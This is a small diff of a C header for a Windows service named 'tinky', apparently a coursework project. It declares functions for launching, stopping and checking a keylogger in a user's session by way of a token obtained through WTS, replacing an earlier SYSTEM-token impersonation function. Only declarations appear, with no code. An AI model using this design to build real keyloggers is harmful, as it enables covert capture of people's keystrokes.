@@ -1,11 +1,12 @@
-#ifndef SERVICE_MANAGER_H
-#define SERVICE_MANAGER_H
+#pragma once
 
 #include <windows.h>
+#include <wtsapi32.h>
 #include <tchar.h>
 #include <strsafe.h>
 #include <stdio.h>
 #include <aclapi.h>
+#include <stdlib.h>
 
 #define SVCNAME TEXT("tinky")
 
@@ -32,9 +33,7 @@ VOID __stdcall DoStartSvc(void);
 VOID __stdcall DoStopSvc(void);
 
 // New functions for project requirements
-BOOL ImpersonateSystemToken(void);
-BOOL LaunchKeylogger(void);
+BOOL LaunchKeyloggerInUserSession(void);
 VOID TerminateKeylogger(void);
 BOOL IsKeyloggerRunning(void);
-
-#endif
+HANDLE GetUserTokenViaWTS(void);
